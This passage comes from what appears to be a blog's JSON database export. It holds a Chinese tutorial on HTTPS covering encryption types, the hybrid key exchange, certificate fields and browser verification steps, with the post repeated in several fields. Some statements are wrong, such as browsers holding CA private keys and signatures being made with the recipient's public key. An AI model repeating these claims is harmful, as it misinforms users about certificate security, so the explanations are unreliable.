首先浏览器读取证书中的证书所有者、有效期等信息进行一一校验\n2. 浏览器开始查找操作系统中已内置的受信任的证书发布机构 CA，与服务器发来的证书中的颁发者 CA 比对，用于校验证书是否为合法机构颁发 \n3. 如果找不到，浏览器就会报错，说明服务器发来的证书是不可信任的。\n4. 如果找到，那么浏览器就会从操作系统中取出颁发者 CA  的公钥，然后对服务器发来的证书里面的签名进行解密\n5. 浏览器使用相同的 hash 算法计算出服务器发来的证书的 hash 值，将这个计算的 hash 值与证书中签名做对比\n6. 对比结果一致，则证明服务器发来的证书合法，没有被冒充\n7. 此时浏览器就可以读取证书中的公钥，用于后续加密了\n\n> 认证信息 ---哈希算法--->  摘要 ---私钥加密---> 数字签名\n\n### 6、HTTPS 的特点\n\n#### HTTPS 优点\n1. 所有信息都是加密传播，黑客无法窃听\n2. 具有校验机制，一旦被篡改，通信双方会立刻发现\n3. 配备身份证书，防止身份被冒充\n\n#### HTTPS 缺点\n1. SSL 证书费用很高，以及其在服务器上的部署、更新维护非常繁琐\n2. HTTPS 降低用户访问速度（多次握手）\n3. 网站改用 HTTPS 以后，由HTTP 跳转到 HTTPS 的方式增加了用户访问耗时（多数网站采用 302 跳转）\n4. HTTPS 涉及到的安全算法会消耗 CPU 资源，需要增加大量机器（https 访问过程需要加解密）","source":"_posts/HTTP/HTTPS 协议.md","raw":"---\ntitle: HTTPS 协议\ncategories: HTTP\ntags: [HTTP]\ndate: 2021-01-14 15:39:00\n---\n\n# HTTPS 协议\n\n### 1、背景介绍\n\nHTTP的请求过程中，客户端与服务器之间没有任何身份确认的过程，数据全部明文传输，容易遭到黑客攻击\n\nHTTP 的主要风险如下：\n1. 窃听风险：黑客可以获知通信内容\n2. 篡改风险：黑客可以修改通信内容\n3. 冒充风险：黑客可以冒充他人身份参与通信\n\nHTTPS：（Secure Hypertext Transfer Protocol）安全超文本传输协议，它基于 HTTP 开发，用于在客户计算机和服务器之间交换信息。它使用安全套接字层 (SSL) 进行信息交换。\n\n一句话总结 HTTPS的过程：\nHTTPS 要使客户端与服务器端的通信过程得到安全保证，必须使用的对称加密算法，但是协商对称加密算法的过程，需要使用非对称加密算法来保证安全，然而直接使用非对称加密的过程本身也不安全，会有中间人篡改公钥的可能性，所以客户端与服务器不直接使用公钥，而是使用数字证书签发机构颁发的证书来保证非对称加密过程本身的安全。这样通过这些机制协商出一个对称加密算法，就此双方使用该算法进行加密解密。从而解决了客户端与服务器端之间的通信安全问题。\n\n### 2、SSL\nSSL (Secure Sockets Layer 安全套接层)，及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS 与 SSL 在传输层对网络连接进行加密。\n\nSSL协议位于 TCP/I P协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。\n\n**特点：**\n1. 认证用户和服务器，确保数据发送到正确的客户机和服务器；\n2. 加密数据以防止数据中途被窃取；\n3. 维护数据的完整性，确保数据在传输过程中不被改变。\n\n### 3、加密算法\n\n#### 3.1 对称加密算法\n\n在对称加密算法中，数据发信方将明文（原始数据）和加密密钥一起经过特殊加密算法处理后，使其变成复杂的加密密文发送出去。收信方收到密文后，若想解读原文，则需要使用加密用过的密钥及相同算法的逆算法对密文进行解密，才能使其恢复成可读明文。\n\n> 在对称加密算法中，使用的密钥只有一个，发收信双方都使用这个密钥对数据进行加密和解密，这就要求解密方事先必须知道加密 **密钥** 和 **加密算法**。\n\n特点：加密强度大，难以破解，加密解密速度快\n\n常见的对称加密算法：**AES** 、**RC4** 、**3DES**\n\n#### 3.2 非对称加密算法\n\n非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。\n\n> * 如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；\n> * 如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密；\n\n特点：性能较低，但是安全性超强\n\n常见的非对称加密算法：**RSA** 、**DSA/DSS**、 **DH** 、、RSA、DSA、ECDSA、 DH\n\n#### 3.3 Hash 算法\n\n说明：将任意长度的信息转换为较短的固定长度的值，通常其长度要比信息小得多，且算法不可逆。\n\n常见的 hash 算法：**MD5**、**SHA-1**、**SHA-2**、**SHA-256**\n\n\n**结论：** \n**非对称算法** 强度复杂、安全性依赖于算法与密钥但是由于其 **算法复杂**，而使得加密解密速度没有对称加密解密的速度快，公钥加密目前只能用来作 **密钥交换** 或者 **内容签名**，**不适合用来做应用层传输内容的加解密会话密钥客户端在认证完服务器**。获得服务器的公钥之后，利用该公钥与服务器进行加密通信，协商出两个会话密钥，分别是用于加密客户端往服务端发送数据的客户端会话密钥，和用于加密服务端往客户端发送数据的服务端会话密钥。在已有服务器公钥，可以加密通讯的前提下，还要协商两个对称密钥的原因，是因为非对称加密相对复杂度更高，**在数据传输过程中，使用对称加密，可以节省计算资源**。另外，会话密钥是随机生成，每次协商都会有不一样的结果，所以安全性也比较高。\n\n\n**使用场景：** \n* 甲方生成一对密钥并将其中的公用密钥公开；得到该公用密钥的乙方使用该密钥对机密信息进行加密后再发送给甲方；甲方再用自己保存的另一把专用密钥对加密后的信息进行解密。\n* 甲方可以使用乙方的公钥对机密信息进行签名后再发送给乙方；乙方再用自己的私匙对数据进行验签。\n\n### 4、数据加密的方式\n\n##### 方式 1：**使用对称加密**\n* 客户端发送给服务器的数据使用 **对称秘钥** 加密，服务器使用 **对称秘钥** 解密\n* 服务器发送给客户端的数据使用 **对称秘钥** 加密，客户端使用 **对称秘钥** 解密\n\n缺点：需维护大量的秘钥、秘钥容易泄露\n\n##### 方式 2：**使用非对称加密**\n* 客户端发送给服务器的数据使用 **公钥** 加密，服务器使用 **私钥** 解密\n* 服务器发送给客户端的数据使用 **私钥** 加密，客户端使用 **公钥** 解密\n\n缺点：公钥是公开的，服务器发送给客户端的数据的数据容易被截获\n\n##### 方式 3：**同时使用对称加密、非对称加密**\n* 客户端发送给服务器的 **对称加密算法、对称秘钥** 使用 **公钥** 加密\n* 服务器发送给客户端的数据用此 **对称加密算法、对称秘钥** 加密，**对称秘钥** 协商完成\n* 客户端发送给服务器的数据使用 **协商的对称秘钥** 加密，服务器使用 **协商的对称秘钥** 解密\n* 服务器发送给的客户端数据使用 **协商的对称秘钥** 加密，客户端使用 **协商的对称秘钥** 解密\n\n> 问题：公钥加密（非对称加密）计算量太大，如何减少耗用的时间？\n> 解决方法：每一次对话（session），客户端和服务器端都生成一个 **对话密钥**（双方协商的对称秘钥），用它来加密信息。由于 **对话密钥** 是对称加密，所以运算速度非常快，而服务器公钥只用于加密 **对话密钥** 本身，这样就减少了加密运算的消耗时间。\n\n![HTTPS 加密过程](https://www.wosign.cn/Basic/images/howsslwork_clip_image002.gif)\n\n很明显，方式 3 比较合适 HTTP 的数据加密，但依然有 **两个** 问题：\n1. 客户端如何获得公钥\n2. 如何确认服务器是真实的而不是黑客\n\n> 获取公钥的过程并不能保证安全，似乎又得重新进行一次加密的过程（先有鸡还是先有蛋的问题），So what to do...\n\n### 5、SSL 证书\n\nSSL证书，也称为服务器 SSL 证书，是遵守 SSL 协议的一种数字证书，由全球信任的证书颁发机构 (Certificate Authority，简称 CA) 验证服务器身份后颁发。将SSL证书安装在网站服务器上，可实现网站身份验证和数据加密传输双重功能。\n\nSSL 证书能同时解决了 **公钥获取** 问题和 **黑客冒充** 问题\n\n> 每种支持 HTTPS 的浏览器都内置的许多 CA 中心的公钥信息，CA 中心是浏览器开发商信任的授权机构，它为有需要的网站颁发用于验证的服务器公钥，颁发前 CA 中心应尽量确认申请者的身份，并确保颁发的服务器证书确实是由该域名使用的。<br/>\n> 至于CA中心的具体实现上，就是在创建一个新的 HTTPS 连接时，浏览器端收到服务器的签名公钥，验证签名后（除非 CA 的私钥泄漏，否则签名无法被伪造），检查证书里被签名的 cn 项（Common Name，常用名称）或 subjectAltName 项的值，由此确认对方确实是浏览器真正要访问的服务器，并确认该公钥不在 CA 机构的公开撤销列表里（例如，证书是假冒或欺诈手段获取到的）。如果所有检查都通过了，浏览器就可以用这个公钥加密信息并传回给服务器端，通过这种方式，确认只有特定的接收者才能对加密信息进行解密。\n\nSSL 证书是 CA 中心用自己 **私钥** 对申请者的信息进行加密的数据，当用户访问服务器是 SSL 证书从服务器下载到本地，然后浏览器内置了权威的 CA 中心的 **私钥**，用此 **私钥** 解密 SSL 证书中的数据，如果客户端计算出来的证书编号（使用证书中的 **签名算法** 进行计算）与证书中的证书编号相同，则验证通过。\n\n\n**SSL 证书包含的具体内容如下：**\n* Version 版本\n* Serial Number序列号\n* Algorithm ID 算法标识\n* Issuer 颁发者\n* Validity 有效期\n* Not Before 有效起始日期\n* Not After 有效终止日期\n* Subject 使用者\n* Subject Public Key Info 使用者公钥信息\n* Public Key Algorithm公钥算法\n* Subject Public Key公钥\n* Issuer Unique Identifier (Optional) 颁发者唯一标识（CA 中心）\n* Subject Unique Identifier (Optional) 使用者唯一标识\n* Extensions (Optional) 扩展\n* ...\n* Certificate Signature Algorithm 证书签名算法（MD5 算法）\n* Certificate Signature 证书签名\n\n**验证步骤：**\n1. 首先浏览器读取证书中的证书所有者、有效期等信息进行一一校验\n2. 浏览器开始查找操作系统中已内置的受信任的证书发布机构 CA，与服务器发来的证书中的颁发者 CA 比对，用于校验证书是否为合法机构颁发 \n3. 如果找不到，浏览器就会报错，说明服务器发来的证书是不可信任的。\n4. 如果找到，那么浏览器就会从操作系统中取出颁发者 CA  的公钥，然后对服务器发来的证书里面的签名进行解密\n5. 浏览器使用相同的 hash 算法计算出服务器发来的证书的 hash 值，将这个计算的 hash 值与证书中签名做对比\n6. 对比结果一致，则证明服务器发来的证书合法，没有被冒充\n7. 此时浏览器就可以读取证书中的公钥，用于后续加密了\n\n> 认证信息 ---哈希算法--->  摘要 ---私钥加密---> 数字签名\n\n### 6、HTTPS 的特点\n\n#### HTTPS 优点\n1. 所有信息都是加密传播，黑客无法窃听\n2. 具有校验机制，一旦被篡改，通信双方会立刻发现\n3. 配备身份证书，防止身份被冒充\n\n#### HTTPS 缺点\n1. SSL 证书费用很高，以及其在服务器上的部署、更新维护非常繁琐\n2. HTTPS 降低用户访问速度（多次握手）\n3. 网站改用 HTTPS 以后，由HTTP 跳转到 HTTPS 的方式增加了用户访问耗时（多数网站采用 302 跳转）\n4. HTTPS 涉及到的安全算法会消耗 CPU 资源，需要增加大量机器（https 访问过程需要加解密）","slug":"HTTP/HTTPS 协议","published":1,"updated":"2021-04-30T07:20:06.353Z","_id":"cko3zke2c00003l6r1ol503eg","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"HTTPS-协议\"><a href=\"#HTTPS-协议\" class=\"headerlink\" title=\"HTTPS 协议\"></a>HTTPS 协议</h1><h3 id=\"1、背景介绍\"><a href=\"#1、背景介绍\" class=\"headerlink\" title=\"1、背景介绍\"></a>1、背景介绍</h3><p>HTTP的请求过程中，客户端与服务器之间没有任何身份确认的过程，数据全部明文传输，容易遭到黑客攻击</p>\n<p>HTTP 的主要风险如下：</p>\n<ol>\n<li>窃听风险：黑客可以获知通信内容</li>\n<li>篡改风险：黑客可以修改通信内容</li>\n<li>冒充风险：黑客可以冒充他人身份参与通信</li>\n</ol>\n<p>HTTPS：（Secure Hypertext Transfer Protocol）安全超文本传输协议，它基于 HTTP 开发，用于在客户计算机和服务器之间交换信息。它使用安全套接字层 (SSL) 进行信息交换。</p>\n<p>一句话总结 HTTPS的过程：<br>HTTPS 要使客户端与服务器端的通信过程得到安全保证，必须使用的对称加密算法，但是协商对称加密算法的过程，需要使用非对称加密算法来保证安全，然而直接使用非对称加密的过程本身也不安全，会有中间人篡改公钥的可能性，所以客户端与服务器不直接使用公钥，而是使用数字证书签发机构颁发的证书来保证非对称加密过程本身的安全。这样通过这些机制协商出一个对称加密算法，就此双方使用该算法进行加密解密。从而解决了客户端与服务器端之间的通信安全问题。</p>\n<h3 id=\"2、SSL\"><a href=\"#2、SSL\" class=\"headerlink\" title=\"2、SSL\"></a>2、SSL</h3><p>SSL (Secure Sockets Layer 安全套接层)，及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS 与 SSL 在传输层对网络连接进行加密。</p>\n<p>SSL协议位于 TCP/I P协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>\n<p><strong>特点：</strong></p>\n<ol>\n<li>认证用户和服务器，确保数据发送到正确的客户机和服务器；</li>\n<li>加密数据以防止数据中途被窃取；</li>\n<li>维护数据的完整性，确保数据在传输过程中不被改变。</li>\n</ol>\n<h3 id=\"3、加密算法\"><a href=\"#3、加密算法\" class=\"headerlink\" title=\"3、加密算法\"></a>3、加密算法</h3><h4 id=\"3-1-对称加密算法\"><a href=\"#3-1-对称加密算法\" class=\"headerlink\" title=\"3.1 对称加密算法\"></a>3.1 对称加密算法</h4><p>在对称加密算法中，数据发信方将明文（原始数据）和加密密钥一起经过特殊加密算法处理后，使其变成复杂的加密密文发送出去。收信方收到密文后，若想解读原文，则需要使用加密用过的密钥及相同算法的逆算法对密文进行解密，才能使其恢复成可读明文。</p>\n<blockquote>\n<p>在对称加密算法中，使用的密钥只有一个，发收信双方都使用这个密钥对数据进行加密和解密，这就要求解密方事先必须知道加密 <strong>密钥</strong> 和 <strong>加密算法</strong>。</p>\n</blockquote>\n<p>特点：加密强度大，难以破解，加密解密速度快</p>\n<p>常见的对称加密算法：<strong>AES</strong> 、<strong>RC4</strong> 、<strong>3DES</strong></p>\n<h4 id=\"3-2-非对称加密算法\"><a href=\"#3-2-非对称加密算法\" class=\"headerlink\" title=\"3.2 非对称加密算法\"></a>3.2 非对称加密算法</h4><p>非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。</p>\n<blockquote>\n<ul>\n<li>如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；</li>\n<li>如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密；</li>\n</ul>\n</blockquote>\n<p>特点：性能较低，但是安全性超强</p>\n<p>常见的非对称加密算法：<strong>RSA</strong> 、<strong>DSA/DSS</strong>、 <strong>DH</strong> 、、RSA、DSA、ECDSA、 DH</p>\n<h4 id=\"3-3-Hash-算法\"><a href=\"#3-3-Hash-算法\" class=\"headerlink\" title=\"3.3 Hash 算法\"></a>3.3 Hash 算法</h4><p>说明：将任意长度的信息转换为较短的固定长度的值，通常其长度要比信息小得多，且算法不可逆。</p>\n<p>常见的 hash 算法：<strong>MD5</strong>、<strong>SHA-1</strong>、<strong>SHA-2</strong>、<strong>SHA-256</strong></p>\n<p><strong>结论：</strong><br><strong>非对称算法</strong> 强度复杂、安全性依赖于算法与密钥但是由于其 <strong>算法复杂</strong>，而使得加密解密速度没有对称加密解密的速度快，公钥加密目前只能用来作 <strong>密钥交换</strong> 或者 <strong>内容签名</strong>，<strong>不适合用来做应用层传输内容的加解密会话密钥客户端在认证完服务器</strong>。获得服务器的公钥之后，利用该公钥与服务器进行加密通信，协商出两个会话密钥，分别是用于加密客户端往服务端发送数据的客户端会话密钥，和用于加密服务端往客户端发送数据的服务端会话密钥。在已有服务器公钥，可以加密通讯的前提下，还要协商两个对称密钥的原因，是因为非对称加密相对复杂度更高，<strong>在数据传输过程中，使用对称加密，可以节省计算资源</strong>。另外，会话密钥是随机生成，每次协商都会有不一样的结果，所以安全性也比较高。</p>\n<p><strong>使用场景：</strong> </p>\n<ul>\n<li>甲方生成一对密钥并将其中的公用密钥公开；得到该公用密钥的乙方使用该密钥对机密信息进行加密后再发送给甲方；甲方再用自己保存的另一把专用密钥对加密后的信息进行解密。</li>\n<li>甲方可以使用乙方的公钥对机密信息进行签名后再发送给乙方；乙方再用自己的私匙对数据进行验签。</li>\n</ul>\n<h3 id=\"4、数据加密的方式\"><a href=\"#4、数据加密的方式\" class=\"headerlink\" title=\"4、数据加密的方式\"></a>4、数据加密的方式</h3><h5 id=\"方式-1：使用对称加密\"><a href=\"#方式-1：使用对称加密\" class=\"headerlink\" title=\"方式 1：使用对称加密\"></a>方式 1：<strong>使用对称加密</strong></h5><ul>\n<li>客户端发送给服务器的数据使用 <strong>对称秘钥</strong> 加密，服务器使用 <strong>对称秘钥</strong> 解密</li>\n<li>服务器发送给客户端的数据使用 <strong>对称秘钥</strong> 加密，客户端使用 <strong>对称秘钥</strong> 解密</li>\n</ul>\n<p>缺点：需维护大量的秘钥、秘钥容易泄露</p>\n<h5 id=\"方式-2：使用非对称加密\"><a href=\"#方式-2：使用非对称加密\" class=\"headerlink\" title=\"方式 2：使用非对称加密\"></a>方式 2：<strong>使用非对称加密</strong></h5><ul>\n<li>客户端发送给服务器的数据使用 <strong>公钥</strong> 加密，服务器使用 <strong>私钥</strong> 解密</li>\n<li>服务器发送给客户端的数据使用 <strong>私钥</strong> 加密，客户端使用 <strong>公钥</strong> 解密</li>\n</ul>\n<p>缺点：公钥是公开的，服务器发送给客户端的数据的数据容易被截获</p>\n<h5 id=\"方式-3：同时使用对称加密、非对称加密\"><a href=\"#方式-3：同时使用对称加密、非对称加密\" class=\"headerlink\" title=\"方式 3：同时使用对称加密、非对称加密\"></a>方式 3：<strong>同时使用对称加密、非对称加密</strong></h5><ul>\n<li>客户端发送给服务器的 <strong>对称加密算法、对称秘钥</strong> 使用 <strong>公钥</strong> 加密</li>\n<li>服务器发送给客户端的数据用此 <strong>对称加密算法、对称秘钥</strong> 加密，<strong>对称秘钥</strong> 协商完成</li>\n<li>客户端发送给服务器的数据使用 <strong>协商的对称秘钥</strong> 加密，服务器使用 <strong>协商的对称秘钥</strong> 解密</li>\n<li>服务器发送给的客户端数据使用 <strong>协商的对称秘钥</strong> 加密，客户端使用 <strong>协商的对称秘钥</strong> 解密</li>\n</ul>\n<blockquote>\n<p>问题：公钥加密（非对称加密）计算量太大，如何减少耗用的时间？<br>解决方法：每一次对话（session），客户端和服务器端都生成一个 <strong>对话密钥</strong>（双方协商的对称秘钥），用它来加密信息。由于 <strong>对话密钥</strong> 是对称加密，所以运算速度非常快，而服务器公钥只用于加密 <strong>对话密钥</strong> 本身，这样就减少了加密运算的消耗时间。</p>\n</blockquote>\n<p><img src=\"https://www.wosign.cn/Basic/images/howsslwork_clip_image002.gif\" alt=\"HTTPS 加密过程\"></p>\n<p>很明显，方式 3 比较合适 HTTP 的数据加密，但依然有 <strong>两个</strong> 问题：</p>\n<ol>\n<li>客户端如何获得公钥</li>\n<li>如何确认服务器是真实的而不是黑客</li>\n</ol>\n<blockquote>\n<p>获取公钥的过程并不能保证安全，似乎又得重新进行一次加密的过程（先有鸡还是先有蛋的问题），So what to do…</p>\n</blockquote>\n<h3 id=\"5、SSL-证书\"><a href=\"#5、SSL-证书\" class=\"headerlink\" title=\"5、SSL 证书\"></a>5、SSL 证书</h3><p>SSL证书，也称为服务器 SSL 证书，是遵守 SSL 协议的一种数字证书，由全球信任的证书颁发机构 (Certificate Authority，简称 CA) 验证服务器身份后颁发。将SSL证书安装在网站服务器上，可实现网站身份验证和数据加密传输双重功能。</p>\n<p>SSL 证书能同时解决了 <strong>公钥获取</strong> 问题和 <strong>黑客冒充</strong> 问题</p>\n<blockquote>\n<p>每种支持 HTTPS 的浏览器都内置的许多 CA 中心的公钥信息，CA 中心是浏览器开发商信任的授权机构，它为有需要的网站颁发用于验证的服务器公钥，颁发前 CA 中心应尽量确认申请者的身份，并确保颁发的服务器证书确实是由该域名使用的。<br/><br>至于CA中心的具体实现上，就是在创建一个新的 HTTPS 连接时，浏览器端收到服务器的签名公钥，验证签名后（除非 CA 的私钥泄漏，否则签名无法被伪造），检查证书里被签名的 cn 项（Common Name，常用名称）或 subjectAltName 项的值，由此确认对方确实是浏览器真正要访问的服务器，并确认该公钥不在 CA 机构的公开撤销列表里（例如，证书是假冒或欺诈手段获取到的）。如果所有检查都通过了，浏览器就可以用这个公钥加密信息并传回给服务器端，通过这种方式，确认只有特定的接收者才能对加密信息进行解密。</p>\n</blockquote>\n<p>SSL 证书是 CA 中心用自己 <strong>私钥</strong> 对申请者的信息进行加密的数据，当用户访问服务器是 SSL 证书从服务器下载到本地，然后浏览器内置了权威的 CA 中心的 <strong>私钥</strong>，用此 <strong>私钥</strong> 解密 SSL 证书中的数据，如果客户端计算出来的证书编号（使用证书中的 <strong>签名算法</strong> 进行计算）与证书中的证书编号相同，则验证通过。</p>\n<p><strong>SSL 证书包含的具体内容如下：</strong></p>\n<ul>\n<li>Version 版本</li>\n<li>Serial Number序列号</li>\n<li>Algorithm ID 算法标识</li>\n<li>Issuer 颁发者</li>\n<li>Validity 有效期</li>\n<li>Not Before 有效起始日期</li>\n<li>Not After 有效终止日期</li>\n<li>Subject 使用者</li>\n<li>Subject Public Key Info 使用者公钥信息</li>\n<li>Public Key Algorithm公钥算法</li>\n<li>Subject Public Key公钥</li>\n<li>Issuer Unique Identifier (Optional) 颁发者唯一标识（CA 中心）</li>\n<li>Subject Unique Identifier (Optional) 使用者唯一标识</li>\n<li>Extensions (Optional) 扩展</li>\n<li>…</li>\n<li>Certificate Signature Algorithm 证书签名算法（MD5 算法）</li>\n<li>Certificate Signature 证书签名</li>\n</ul>\n<p><strong>验证步骤：</strong></p>\n<ol>\n<li>首先浏览器读取证书中的证书所有者、有效期等信息进行一一校验</li>\n<li>浏览器开始查找操作系统中已内置的受信任的证书发布机构 CA，与服务器发来的证书中的颁发者 CA 比对，用于校验证书是否为合法机构颁发 </li>\n<li>如果找不到，浏览器就会报错，说明服务器发来的证书是不可信任的。</li>\n<li>如果找到，那么浏览器就会从操作系统中取出颁发者 CA  的公钥，然后对服务器发来的证书里面的签名进行解密</li>\n<li>浏览器使用相同的 hash 算法计算出服务器发来的证书的 hash 值，将这个计算的 hash 值与证书中签名做对比</li>\n<li>对比结果一致，则证明服务器发来的证书合法，没有被冒充</li>\n<li>此时浏览器就可以读取证书中的公钥，用于后续加密了</li>\n</ol>\n<blockquote>\n<p>认证信息 —哈希算法—&gt;  摘要 —私钥加密—&gt; 数字签名</p>\n</blockquote>\n<h3 id=\"6、HTTPS-的特点\"><a href=\"#6、HTTPS-的特点\" class=\"headerlink\" title=\"6、HTTPS 的特点\"></a>6、HTTPS 的特点</h3><h4 id=\"HTTPS-优点\"><a href=\"#HTTPS-优点\" class=\"headerlink\" title=\"HTTPS 优点\"></a>HTTPS 优点</h4><ol>\n<li>所有信息都是加密传播，黑客无法窃听</li>\n<li>具有校验机制，一旦被篡改，通信双方会立刻发现</li>\n<li>配备身份证书，防止身份被冒充</li>\n</ol>\n<h4 id=\"HTTPS-缺点\"><a href=\"#HTTPS-缺点\" class=\"headerlink\" title=\"HTTPS 缺点\"></a>HTTPS 缺点</h4><ol>\n<li>SSL 证书费用很高，以及其在服务器上的部署、更新维护非常繁琐</li>\n<li>HTTPS 降低用户访问速度（多次握手）</li>\n<li>网站改用 HTTPS 以后，由HTTP 跳转到 HTTPS 的方式增加了用户访问耗时（多数网站采用 302 跳转）</li>\n<li>HTTPS 涉及到的安全算法会消耗 CPU 资源，需要增加大量机器（https 访问过程需要加解密）</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"HTTPS-协议\"><a href=\"#HTTPS-协议\" class=\"headerlink\" title=\"HTTPS 协议\"></a>HTTPS 协议</h1><h3 id=\"1、背景介绍\"><a href=\"#1、背景介绍\" class=\"headerlink\" title=\"1、背景介绍\"></a>1、背景介绍</h3><p>HTTP的请求过程中，客户端与服务器之间没有任何身份确认的过程，数据全部明文传输，容易遭到黑客攻击</p>\n<p>HTTP 的主要风险如下：</p>\n<ol>\n<li>窃听风险：黑客可以获知通信内容</li>\n<li>篡改风险：黑客可以修改通信内容</li>\n<li>冒充风险：黑客可以冒充他人身份参与通信</li>\n</ol>\n<p>HTTPS：（Secure Hypertext Transfer Protocol）安全超文本传输协议，它基于 HTTP 开发，用于在客户计算机和服务器之间交换信息。它使用安全套接字层 (SSL) 进行信息交换。</p>\n<p>一句话总结 HTTPS的过程：<br>HTTPS 要使客户端与服务器端的通信过程得到安全保证，必须使用的对称加密算法，但是协商对称加密算法的过程，需要使用非对称加密算法来保证安全，然而直接使用非对称加密的过程本身也不安全，会有中间人篡改公钥的可能性，所以客户端与服务器不直接使用公钥，而是使用数字证书签发机构颁发的证书来保证非对称加密过程本身的安全。这样通过这些机制协商出一个对称加密算法，就此双方使用该算法进行加密解密。从而解决了客户端与服务器端之间的通信安全问题。</p>\n<h3 id=\"2、SSL\"><a href=\"#2、SSL\" class=\"headerlink\" title=\"2、SSL\"></a>2、SSL</h3><p>SSL (Secure Sockets Layer 安全套接层)，及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS 与 SSL 在传输层对网络连接进行加密。</p>\n<p>SSL协议位于 TCP/I P协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>\n<p><strong>特点：</strong></p>\n<ol>\n<li>认证用户和服务器，确保数据发送到正确的客户机和服务器；</li>\n<li>加密数据以防止数据中途被窃取；</li>\n<li>维护数据的完整性，确保数据在传输过程中不被改变。</li>\n</ol>\n<h3 id=\"3、加密算法\"><a href=\"#3、加密算法\" class=\"headerlink\" title=\"3、加密算法\"></a>3、加密算法</h3><h4 id=\"3-1-对称加密算法\"><a href=\"#3-1-对称加密算法\" class=\"headerlink\" title=\"3.1 对称加密算法\"></a>3.1 对称加密算法</h4><p>在对称加密算法中，数据发信方将明文（原始数据）和加密密钥一起经过特殊加密算法处理后，使其变成复杂的加密密文发送出去。收信方收到密文后，若想解读原文，则需要使用加密用过的密钥及相同算法的逆算法对密文进行解密，才能使其恢复成可读明文。</p>\n<blockquote>\n<p>在对称加密算法中，使用的密钥只有一个，发收信双方都使用这个密钥对数据进行加密和解密，这就要求解密方事先必须知道加密 <strong>密钥</strong> 和 <strong>加密算法</strong>。</p>\n</blockquote>\n<p>特点：加密强度大，难以破解，加密解密速度快</p>\n<p>常见的对称加密算法：<strong>AES</strong> 、<strong>RC4</strong> 、<strong>3DES</strong></p>\n<h4 id=\"3-2-非对称加密算法\"><a href=\"#3-2-非对称加密算法\" class=\"headerlink\" title=\"3.2 非对称加密算法\"></a>3.2 非对称加密算法</h4><p>非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。</p>\n<blockquote>\n<ul>\n<li>如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；</li>\n<li>如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密；</li>\n</ul>\n</blockquote>\n<p>特点：性能较低，但是安全性超强</p>\n<p>常见的非对称加密算法：<strong>RSA</strong> 、<strong>DSA/DSS</strong>、 <strong>DH</strong> 、、RSA、DSA、ECDSA、 DH</p>\n<h4 id=\"3-3-Hash-算法\"><a href=\"#3-3-Hash-算法\" class=\"headerlink\" title=\"3.3 Hash 算法\"></a>3.3 Hash 算法</h4><p>说明：将任意长度的信息转换为较短的固定长度的值，通常其长度要比信息小得多，且算法不可逆。</p>\n<p>常见的 hash 算法：<strong>MD5</strong>、<strong>SHA-1</strong>、<strong>SHA-2</strong>、<strong>SHA-256</strong></p>\n<p><strong>结论：</strong><br><strong>非对称算法</strong> 强度复杂、安全性依赖于算法与密钥但是由于其 <strong>算法复杂</strong>，而使得加密解密速度没有对称加密解密的速度快，公钥加密目前只能用来作 <strong>密钥交换</strong> 或者 <strong>内容签名</strong>，<strong>不适合用来做应用层传输内容的加解密会话密钥客户端在认证完服务器</strong>。获得服务器的公钥之后，利用该公钥与服务器进行加密通信，协商出两个会话密钥，分别是用于加密客户端往服务端发送数据的客户端会话密钥，和用于加密服务端往客户端发送数据的服务端会话密钥。在已有服务器公钥，可以加密通讯的前提下，还要协商两个对称密钥的原因，是因为非对称加密相对复杂度更高，<strong>在数据传输过程中，使用对称加密，可以节省计算资源</strong>。另外，会话密钥是随机生成，每次协商都会有不一样的结果，所以安全性也比较高。</p>\n<p><strong>使用场景：</strong> </p>\n<ul>\n<li>甲方生成一对密钥并将其中的公用密钥公开；得到该公用密钥的乙方使用该密钥对机密信息进行加密后再发送给甲方；甲方再用自己保存的另一把专用密钥对加密后的信息进行解密。</li>\n<li>甲方可以使用乙方的公钥对机密信息进行签名后再发送给乙方；乙方再用自己的私匙对数据进行验签。</li>\n</ul>\n<h3 id=\"4、数据加密的方式\"><a href=\"#4、数据加密的方式\" class=\"headerlink\" title=\"4、数据加密的方式\"></a>4、数据加密的方式</h3><h5 id=\"方式-1：使用对称加密\"><a href=\"#方式-1：使用对称加密\" class=\"headerlink\" title=\"方式 1：使用对称加密\"></a>方式 1：<strong>使用对称加密</strong></h5><ul>\n<li>客户端发送给服务器的数据使用 <strong>对称秘钥</strong> 加密，服务器使用 <strong>对称秘钥</strong> 解密</li>\n<li>服务器发送给客户端的数据使用 <strong>对称秘钥</strong> 加密，客户端使用 <strong>对称秘钥</strong> 解密</li>\n</ul>\n<p>缺点：需维护大量的秘钥、秘钥容易泄露</p>\n<h5 